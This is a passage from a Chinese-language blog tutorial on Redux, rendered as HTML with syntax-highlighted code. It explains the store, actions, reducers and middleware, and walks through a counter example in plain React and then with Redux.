应用中多个组件共享的状态。</p>\n<h2 id=\"核心api\"><a href=\"#核心api\" class=\"headerlink\" title=\"核心api\"></a>核心api</h2><h3 id=\"createStore\"><a href=\"#createStore\" class=\"headerlink\" title=\"createStore()\"></a>createStore()</h3><p>作用：创建包含指定 reducer 的 store 对象</p>\n<figure class=\"highlight jsx\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> &#123;createStore&#125; <span class=\"keyword\">from</span> <span class=\"string\">'redux'</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> reducer <span class=\"keyword\">from</span> <span class=\"string\">'./reducer'</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> store = createStore(reducer)</span><br></pre></td></tr></table></figure>\n<h3 id=\"store\"><a href=\"#store\" class=\"headerlink\" title=\"store\"></a>store</h3><p>作用：redux 库最核心的管理对象</p>\n<p>它内部维护着：state 和 reducer</p>\n<p>核心方法：<code>getState()</code>、<code>dispatch(action)</code>、<code>subscribe(listener)</code></p>\n<p>编码：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">store.getState()</span><br><span class=\"line\">store.dispatch(&#123;<span class=\"attr\">type</span>:<span class=\"string\">'INCREMENT'</span>, number&#125;)</span><br><span class=\"line\">store.subscribe(render)</span><br></pre></td></tr></table></figure>\n<h3 id=\"applyMiddleware\"><a href=\"#applyMiddleware\" class=\"headerlink\" title=\"applyMiddleware()\"></a>applyMiddleware()</h3><p>作用：应用上基于 redux 的中间件(插件库)</p>\n<p>编码：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> &#123;createStore, applyMiddleware&#125; <span class=\"keyword\">from</span> <span class=\"string\">'redux'</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> thunk <span class=\"keyword\">from</span> <span class=\"string\">'redux-thunk'</span> <span class=\"comment\">// redux 异步中间件</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> store = createStore(</span><br><span class=\"line\">\tcounter,</span><br><span class=\"line\">    applyMiddleware(thunk) <span class=\"comment\">// 应用上异步中间件</span></span><br><span class=\"line\">)</span><br></pre></td></tr></table></figure>\n<h3 id=\"combineReducers\"><a href=\"#combineReducers\" class=\"headerlink\" title=\"combineReducers()\"></a>combineReducers()</h3><p>作用：合并多个 reducer 函数</p>\n<p>编码：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">export default combineReducers(&#123;</span><br><span class=\"line\">\tuser,</span><br><span class=\"line\">\tchatUser,</span><br><span class=\"line\">\tchat</span><br><span class=\"line\">&#125;)</span><br></pre></td></tr></table></figure>\n<h2 id=\"redux-的三个核心概念\"><a href=\"#redux-的三个核心概念\" class=\"headerlink\" title=\"redux 的三个核心概念\"></a>redux 的三个核心概念</h2><h3 id=\"action\"><a href=\"#action\" class=\"headerlink\" title=\"action\"></a>action</h3><p>作用：标识要执行行为的对象</p>\n<p>包含2个方面的属性</p>\n<ul>\n<li>type：标识属性, 值为字符串, 唯一, 必要属性</li>\n<li>XXX：数据属性，值类型任意，可选属性</li>\n</ul>\n<p>例子：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> action = &#123;</span><br><span class=\"line\">    type: <span class=\"string\">'INCREMENT'</span>,</span><br><span class=\"line\">    data: <span class=\"number\">2</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>Action Creator(创建 Action 的工厂函数)</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> increment = <span class=\"function\">(<span class=\"params\">number</span>) =&gt;</span> (&#123;<span class=\"attr\">type</span>: <span class=\"string\">'INCREMENT'</span>, <span class=\"attr\">data</span>: number&#125;)</span><br></pre></td></tr></table></figure>\n<h3 id=\"reducer\"><a href=\"#reducer\" class=\"headerlink\" title=\"reducer\"></a>reducer</h3><p>作用：根据老的 state 和 action, 产生新的 state 的纯函数</p>\n<p>样例：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">default</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">counter</span>(<span class=\"params\">state = <span class=\"number\">0</span>, action</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">switch</span> (action.type) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">case</span> <span class=\"string\">'INCREMENT'</span>:</span><br><span class=\"line\">      <span class=\"keyword\">return</span> state + action.data</span><br><span class=\"line\">    <span class=\"keyword\">case</span> <span class=\"string\">'DECREMENT'</span>:</span><br><span class=\"line\">      <span class=\"keyword\">return</span> state - action.data</span><br><span class=\"line\">    <span class=\"keyword\">default</span>:</span><br><span class=\"line\">      <span class=\"keyword\">return</span> state</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>注意：返回一个新的状态，不要修改原来的状态</p>\n<h3 id=\"store-1\"><a href=\"#store-1\" class=\"headerlink\" title=\"store\"></a>store</h3><p>将 state,action 与 reducer 联系在一起的对象</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> &#123;createStore&#125; <span class=\"keyword\">from</span> <span class=\"string\">'redux'</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> reducer <span class=\"keyword\">from</span> <span class=\"string\">'./reducer'</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> store = createStore(reducer)</span><br></pre></td></tr></table></figure>\n<p>此对象的功能：</p>\n<ul>\n<li>getState(): 得到 state</li>\n<li>dispatch(action): 分发 action, 触发 reducer 调用, 产生新的 state</li>\n<li>subscribe(listener): 注册监听, 当产生了新的 state 时, 自动调用</li>\n</ul>\n<h2 id=\"count计数案例\"><a href=\"#count计数案例\" class=\"headerlink\" title=\"count计数案例\"></a>count计数案例</h2><p>###react实现计数</p>\n<figure class=\"highlight jsx\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> React, &#123; Component &#125; <span class=\"keyword\">from</span> <span class=\"string\">'react'</span></span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">default</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">App</span> <span class=\"keyword\">extends</span> <span class=\"title\">Component</span> </span>&#123;</span><br><span class=\"line\">  state = &#123;</span><br><span class=\"line\">    count: <span class=\"number\">0</span> <span class=\"comment\">// 定义变量</span></span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">constructor</span>(props) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">super</span>(props)</span><br><span class=\"line\">    <span class=\"comment\">// 创建ref，将其赋值给一个变量，通过ref挂载在dom节点或组件上，该ref的current属性将能拿到dom节点或组件的实例</span></span><br><span class=\"line\">    <span class=\"keyword\">this</span>.numberRef = React.createRef()</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  increment = <span class=\"function\"><span class=\"params\">()</span> =&gt;</span> &#123; <span class=\"comment\">// 同步加</span></span><br><span class=\"line\">    <span class=\"keyword\">const</span> number = <span class=\"keyword\">this</span>.numberRef.current.value * <span class=\"number\">1</span></span><br><span class=\"line\">    <span class=\"keyword\">this</span>.setState(<span class=\"function\"><span class=\"params\">state</span> =&gt;</span> (&#123; <span class=\"attr\">count</span>: state.count + number &#125;))</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  decrement = <span class=\"function\"><span class=\"params\">()</span> =&gt;</span> &#123; <span class=\"comment\">// 同步减</span></span><br><span class=\"line\">    <span class=\"keyword\">const</span> number = <span class=\"keyword\">this</span>.numberRef.current.value * <span class=\"number\">1</span></span><br><span class=\"line\">    <span class=\"keyword\">this</span>.setState(<span class=\"function\"><span class=\"params\">state</span> =&gt;</span> (&#123; <span class=\"attr\">count</span>: state.count - number &#125;))</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  incrementIfOdd = <span class=\"function\"><span class=\"params\">()</span> =&gt;</span> &#123; <span class=\"comment\">// 奇数加</span></span><br><span class=\"line\">    <span class=\"keyword\">const</span> number = <span class=\"keyword\">this</span>.numberRef.current.value * <span class=\"number\">1</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"keyword\">this</span>.state.count % <span class=\"number\">2</span> === <span class=\"number\">1</span>) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">this</span>.setState(<span class=\"function\"><span class=\"params\">state</span> =&gt;</span> (&#123; <span class=\"attr\">count</span>: state.count + number &#125;))</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  incrementAsync = <span class=\"function\"><span class=\"params\">()</span> =&gt;</span> &#123; <span class=\"comment\">// 异步加</span></span><br><span class=\"line\">    <span class=\"keyword\">const</span> number = <span class=\"keyword\">this</span>.numberRef.current.value * <span class=\"number\">1</span></span><br><span class=\"line\">    setTimeout(<span class=\"function\"><span class=\"params\">()</span> =&gt;</span> &#123;</span><br><span class=\"line\">      <span class=\"keyword\">this</span>.setState(<span class=\"function\"><span class=\"params\">state</span> =&gt;</span> (&#123; <span class=\"attr\">count</span>: state.count + number &#125;))</span><br><span class=\"line\">    &#125;, <span class=\"number\">1000</span>)</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  render() &#123;</span><br><span class=\"line\">    <span class=\"keyword\">const</span> count = <span class=\"keyword\">this</span>.state.count</span><br><span class=\"line\">    <span class=\"keyword\">return</span> (</span><br><span class=\"line\">      &lt;div&gt;</span><br><span class=\"line\">        &lt;p&gt;click &#123;count&#125; times&lt;<span class=\"regexp\">/p&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">        &lt;div&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">          &lt;select ref=&#123;this.numberRef&#125;&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">            &lt;option value=\"1\"&gt;1&lt;/</span>option&gt;</span><br><span class=\"line\">            &lt;option value=<span class=\"string\">\"2\"</span>&gt;<span class=\"number\">2</span>&lt;<span class=\"regexp\">/option&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">            &lt;option value=\"3\"&gt;3&lt;/</span>option&gt;</span><br><span class=\"line\">          &lt;<span class=\"regexp\">/select&gt;&#123;' '&#125;</span></span><br><span class=\"line\"><span class=\"regexp\">          &amp;nbsp;&amp;nbsp;</span></span><br><span class=\"line\"><span class=\"regexp\">          &lt;button onClick=&#123;this.increment&#125;&gt;+&lt;/</span>button&gt;&amp;nbsp;&amp;nbsp;</span><br><span class=\"line\">          &lt;button onClick=&#123;<span class=\"keyword\">this</span>.decrement&#125;&gt;-<span class=\"xml\"><span class=\"tag\">&lt;/<span class=\"name\">button</span>&gt;</span></span>&amp;nbsp;&amp;nbsp;</span><br><span class=\"line\">          &lt;button onClick=&#123;<span class=\"keyword\">this</span>.incrementIfOdd&#125;&gt;increment <span class=\"keyword\">if</span> odd&lt;<span class=\"regexp\">/button&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">          &amp;nbsp;&amp;nbsp;</span></span><br><span class=\"line\"><span class=\"regexp\">          &lt;button onClick=&#123;this.incrementAsync&#125;&gt;increment async&lt;/</span>button&gt;</span><br><span class=\"line\">        &lt;<span class=\"regexp\">/div&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">      &lt;/</span>div&gt;</span><br><span class=\"line\">    )</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"react-redux版本\"><a href=\"#react-redux版本\" class=\"headerlink\" title=\"react_redux版本\"></a>react_redux版本</h2><p><img src=\"/view/posts/a8054c2/react-redux%E8%80%A6%E5%90%88.gif\" alt=\"react-redux耦合\"></p>\n<p>实现思路：</p>\n<p><img src=\"/view/posts/a8054c2/react-redux.png\" alt=\"react-redux\"></p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// index.js</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> React <span class=\"keyword\">from</span> <span class=\"string\">'react'</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> ReactDOM <span class=\"keyword\">from</span> <span class=\"string\">'react-dom'</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> App <span class=\"keyword\">from</span> <span class=\"string\">'./App'</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> store <span class=\"keyword\">from</span> <span class=\"string\">'./redux/store'</span></span><br><span class=\"line\"></span><br><span class=\"line\">ReactDOM.render(<span class=\"xml\"><span class=\"tag\">&lt;<span class=\"name\">App</span> <span class=\"attr\">store</span>=<span class=\"string\">&#123;store&#125;/</span>&gt;</span>, document.getElementById('root'))</span></span><br><span class=\"line\"><span class=\"xml\"></span></span><br><span class=\"line\"><span class=\"xml\">// 给store绑定状态更新的监听</span></span><br><span class=\"line\"><span class=\"xml\">store.subscribe(() =&gt; &#123; // store内部的状态数据发生改变时回调</span></span><br><span class=\"line\"><span class=\"xml\">  // 重新渲染App组件标签</span></span><br><span class=\"line\">  ReactDOM.render(&lt;App store=&#123;store&#125;/&gt;, document.getElementById('root'))</span><br><span class=\"line\">&#125;)</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// redux/store.js</span></span><br><span class=\"line\"><span class=\"comment\">// redux最核心的管理对象: store</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> &#123;createStore&#125; <span class=\"keyword\">from</span> <span class=\"string\">'redux'</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> reducer <span class=\"keyword\">from</span> <span class=\"string\">'./reducer'</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">default</span> createStore(reducer) <span class=\"comment\">// 创建store对象内部会第一次调用reducer()得到初始状态值</span></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// redux/reducer.js</span></span><br><span class=\"line\"><span class=\"comment\">// reducer函数模块: 根据当前state和指定action返回一个新的state</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> &#123; INCREMENT, DECREMENT &#125; <span class=\"keyword\">from</span> <span class=\"string\">'./action-types'</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 管理count状态数据的reducer</span></span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">default</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">count</span>(<span class=\"params\">state = <span class=\"number\">1</span>, action</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"built_in\">console</span>.log(<span class=\"string\">'count()'</span>, state, action)</span><br><span class=\"line\">  <span class=\"keyword\">switch</span> (action.type) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">case</span> INCREMENT:</span><br><span class=\"line\">      <span class=\"keyword\">return</span> state + action.data</span><br><span class=\"line\">    <span class=\"keyword\">case</span> DECREMENT:</span><br><span class=\"line\">      <span class=\"keyword\">return</span> state - action.data</span><br><span class=\"line\">    <span class=\"keyword\">default</span>:</span><br><span class=\"line\">      <span class=\"keyword\">return</span> state</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// redux/action-types.js</span></span><br><span class=\"line\"><span class=\"comment\">// 包含n个action type常量名称的模块</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">const</span> INCREMENT = <span class=\"string\">'increment'</span></span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">const</span> DECREMENT = <span class=\"string\">'decrement'</span></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// redux/action.js</span></span><br><span class=\"line\"><span class=\"comment\">// 包含n个用来创建action的工厂函数(action creator)</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> &#123; INCREMENT, DECREMENT &#125; <span class=\"keyword\">from</span> <span class=\"string\">'./action-types'</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\">增加的action</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">const</span> increment = <span class=\"function\"><span class=\"params\">number</span> =&gt;</span> (&#123; <span class=\"attr\">type</span>: INCREMENT, <span class=\"attr\">data</span>: number &#125;)</span><br><span class=\"line\"><span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\">减少的action</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">const</span> decrement = <span class=\"function\"><span class=\"params\">number</span> =&gt;</span> (&#123; <span class=\"attr\">type</span>: DECREMENT, <span class=\"attr\">data</span>: number &#125;)</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight jsx\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// App.jsx</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> React, &#123;Component&#125; <span class=\"keyword\">from</span> <span class=\"string\">'react'</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> PropTypes <span class=\"keyword\">from</span> <span class=\"string\">'prop-types'</span></span><br><span class=\"line\"><span class=\"comment\">// 引入 actions，在store.dispatch()触发更新</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> &#123;increment, decrement&#125; <span class=\"keyword\">from</span> <span class=\"string\">'./redux/actions'</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">default</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">App</span> <span class=\"keyword\">extends</span> <span class=\"title\">Component</span> </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">static</span> propTypes = &#123;</span><br><span class=\"line\">    store: PropTypes.object.isRequired</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">constructor</span>(props) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">super</span>(props)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">this</span>.numberRef = React.createRef()</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  increment = <span class=\"function\"><span class=\"params\">()</span> =&gt;</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">const</span> number = <span class=\"keyword\">this</span>.numberRef.current.value * <span class=\"number\">1</span></span><br><span class=\"line\">    <span class=\"keyword\">this</span>.props.store.dispatch(increment(number))</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  decrement = <span class=\"function\"><span class=\"params\">()</span> =&gt;</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">const</span> number = <span class=\"keyword\">this</span>.numberRef.current.value * <span class=\"number\">1</span></span><br><span class=\"line\">    <span class=\"keyword\">this</span>.props.store.dispatch(decrement(number))</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  incrementIfOdd = <span class=\"function\"><span class=\"params\">()</span> =&gt;</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">const</span> number = <span class=\"keyword\">this</span>.numberRef.current.value * <span class=\"number\">1</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"keyword\">this</span>.props.store.getState() % <span class=\"number\">2</span> === <span class=\"number\">1</span>) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">this</span>.props.store.dispatch(increment(number))</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  incrementAsync = <span class=\"function\"><span class=\"params\">()</span> =&gt;</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">const</span> number = <span class=\"keyword\">this</span>.numberRef.current.value * <span class=\"number\">1</span></span><br><span class=\"line\">    setTimeout(<span class=\"function\"><span class=\"params\">()</span> =&gt;</span> &#123;</span><br><span class=\"line\">      <span class=\"keyword\">this</span>.props.store.dispatch(increment(number))</span><br><span class=\"line\">    &#125;, <span class=\"number\">1000</span>)</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  render() &#123;</span><br><span class=\"line\">    <span class=\"keyword\">const</span> count = <span class=\"keyword\">this</span>.props.store.getState()</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> (</span><br><span class=\"line\">      &lt;div&gt;</span><br><span class=\"line\">        &lt;p&gt;click &#123;count&#125; times&lt;<span class=\"regexp\">/p&gt;</span></span><br><span class=\"line\"><span class=\"regexp\"></span></span><br><span class=\"line\"><span class=\"regexp\">        &lt;div&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">          &lt;select ref=&#123;this.numberRef&#125;&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">            &lt;option value=\"1\"&gt;1&lt;/</span>option&gt;</span><br><span class=\"line\">            &lt;option value=<span class=\"string\">\"2\"</span>&gt;<span class=\"number\">2</span>&lt;<span class=\"regexp\">/option&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">            &lt;option value=\"3\"&gt;3&lt;/</span>option&gt;</span><br><span class=\"line\">          &lt;<span class=\"regexp\">/select&gt; &amp;nbsp;&amp;nbsp;</span></span><br><span class=\"line\"><span class=\"regexp\">          &lt;button onClick=&#123;this.increment&#125;&gt;+&lt;/</span>button&gt;&amp;nbsp;&amp;nbsp;</span><br><span class=\"line\">          &lt;button onClick=&#123;<span class=\"keyword\">this</span>.decrement&#125;&gt;-<span class=\"xml\"><span class=\"tag\">&lt;/<span class=\"name\">button</span>&gt;</span></span>&amp;nbsp;&amp;nbsp;</span><br><span class=\"line\">          &lt;button onClick=&#123;<span class=\"keyword\">this</span>.incrementIfOdd&#125;&gt;increment <span class=\"keyword\">if</span> odd&lt;<span class=\"regexp\">/button&gt;&amp;nbsp;&amp;nbsp;</span></span><br><span class=\"line\"><span class=\"regexp\">          &lt;button onClick=&#123;this.incrementAsync&#125;&gt;increment async&lt;/</span>button&gt;</span><br><span class=\"line\">        &lt;<span class=\"regexp\">/div&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">      &lt;/</span>div&gt;</span><br><span class=\"line\">    )</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>缺点：</p>\n<p>1) redux 与 react 组件的代码耦合度太高</p>\n<p>2) 编码不够简洁</p>\n<h2 id=\"react-redux库\"><a href=\"#react-redux库\" class=\"headerlink\" 